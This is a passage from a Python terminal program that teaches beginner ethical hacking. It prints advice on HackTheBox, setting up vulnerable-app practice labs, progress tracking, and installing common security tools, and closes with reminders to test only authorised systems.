        print(f"{self.colors['GREEN']}Getting Started:{self.colors['END']}")
        print("1. Sign up: https://hackthebox.com")
        print("2. Complete the connection guide")
        print("3. Download OpenVPN configuration")
        print("4. Connect to the HTB network\n")
        
        print(f"{self.colors['BLUE']}Starting Point:{self.colors['END']}")
        print("1. Begin with 'Starting Point' machines")
        print("2. These are guided and easier")
        print("3. Learn methodology and tools")
        print("4. Build confidence before retired machines\n")
        
        print(f"{self.colors['YELLOW']}Machine Difficulty Levels:{self.colors['END']}")
        print("• Easy - Good for beginners")
        print("• Medium - Intermediate skills required") 
        print("• Hard - Advanced techniques needed")
        print("• Insane - Expert level challenges\n")
        
        print(f"{self.colors['GREEN']}Learning Approach:{self.colors['END']}")
        print("• Read writeups after solving")
        print("• Join the HTB community")
        print("• Participate in challenges")
        print("• Consider VIP for more content")
        
        self.press_continue()

    def custom_labs(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🔧 CUSTOM LAB CREATION{self.colors['END']}\n")
        
        print("Build your own practice environments:\n")
        
        print(f"{self.colors['GREEN']}Home Lab Setup:{self.colors['END']}")
        print("• Use old computers or Raspberry Pi")
        print("• Install vulnerable applications")
        print("• Create isolated network segments")
        print("• Practice defense and monitoring\n")
        
        print(f"{self.colors['BLUE']}Docker-Based Labs:{self.colors['END']}")
        print("# Vulnerable WordPress")
        print("docker run -d --name vulnerable-wp -p 8080:80 wpscanteam/vulnerablewordpress")
        
        print("\n# DVWA (Damn Vulnerable Web App)")
        print("docker run -d --name dvwa -p 8081:80 vulnerables/web-dvwa")
        
        print("\n# bWAPP")
        print("docker run -d --name bwapp -p 8082:80 raesene/bwapp")
        
        print(f"\n{self.colors['YELLOW']}Virtual Machine Labs:{self.colors['END']}")
        print("• Kali Linux - Attack machine")
        print("• Metasploitable - Vulnerable target") 
        print("• Windows VMs - AD environment practice")
        print("• Custom builds - Specific scenarios")
        
        self.press_continue()

    def progress_tracking(self):
        self.print_header()
        print(f"{self.colors['CYAN']}📊 LEARNING PROGRESS{self.colors['END']}\n")
        
        total_modules = 4
        completed = sum(1 for progress in self.progress.values() if progress == 100)
        overall_progress = (completed / total_modules) * 100
        
        print(f"Overall Progress: {self.colors['GREEN']}{overall_progress:.1f}%{self.colors['END']}\n")
        
        for module, progress in self.progress.items():
            color = self.colors['GREEN'] if progress == 100 else self.colors['YELLOW'] if progress > 0 else self.colors['RED']
            module_name = module.replace('_', ' ').title()
            print(f"{module_name}: {color}{progress}%{self.colors['END']}")
        
        print(f"\n{self.colors['BLUE']}Recommendations:{self.colors['END']}")
        if overall_progress < 25:
            print("• Start with Network Scanning module")
            print("• Practice basic commands")
            print("• Build foundational knowledge")
        elif overall_progress < 50:
            print("• Continue with Web Security")
            print("• Set up practice environments") 
            print("• Join online communities")
        elif overall_progress < 75:
            print("• Explore Cryptography")
            print("• Try CTF challenges")
            print("• Practice on HackTheBox")
        else:
            print("• Master Digital Forensics")
            print("• Consider certifications")
            print("• Help others learn")
        
        self.press_continue()

    def tool_installation(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🛠 TOOL INSTALLATION GUIDE{self.colors['END']}\n")
        
        tools = {
            'nmap': 'Network scanning and discovery',
            'wireshark': 'Network protocol analysis',
            'john': 'Password cracking',
            'sqlmap': 'Automated SQL injection',
            'metasploit': 'Penetration testing framework',
            'burpsuite': 'Web application security testing',
            'gobuster': 'Directory and file brute-forcing',
            'hydra': 'Network login cracker'
        }
        
        print(f"{self.colors['GREEN']}Essential Tools:{self.colors['END']}\n")
        
        for tool, description in tools.items():
            installed = self.check_tool(tool)
            status = f"{self.colors['GREEN']}✅ INSTALLED{self.colors['END']}" if installed else f"{self.colors['RED']}❌ MISSING{self.colors['END']}"
            print(f"{status} {self.colors['BOLD']}{tool}{self.colors['END']}")
            print(f"     {description}")
            
            if not installed:
                if tool == 'nmap':
                    print(f"     {self.colors['YELLOW']}Install: pkg install nmap{self.colors['END']}")
                elif tool == 'wireshark':
                    print(f"     {self.colors['YELLOW']}Install: pkg install wireshark{self.colors['END']}")
                elif tool == 'john':
                    print(f"     {self.colors['YELLOW']}Install: pkg install john{self.colors['END']}")
                elif tool == 'sqlmap':
                    print(f"     {self.colors['YELLOW']}Install: pkg install sqlmap{self.colors['END']}")
                elif tool == 'metasploit':
                    print(f"     {self.colors['YELLOW']}Install: pkg install metasploit{self.colors['END']}")
            print()
        
        print(f"{self.colors['BLUE']}Quick Setup for Termux:{self.colors['END']}")
        print("pkg update && pkg install python nmap git curl wireshark -y")
        print("pip install requests bs4 scapy")
        
        self.press_continue()

    def press_continue(self):
        input(f"\n{self.colors['YELLOW']}Press Enter to continue...{self.colors['END']}")

    def exit_program(self):
        self.print_header()
        print(f"{self.colors['GREEN']}Thank you for learning with HCO Terminal!{self.colors['END']}\n")
        print("Remember: Always practice ethical hacking.")
        print("Only test systems you own or have permission to test.")
        print("Stay curious, keep learning! 🛡️\n")
        sys.exit(0)

def main():
    try:
        teacher = HackingTeacher()
        teacher.main_menu()
    except KeyboardInterrupt:
        print(f"\n{teacher.colors['GREEN']}Goodbye! Stay ethical! 🛡️{teacher.colors['END']}")

if __name__ == '__main__':
    main()
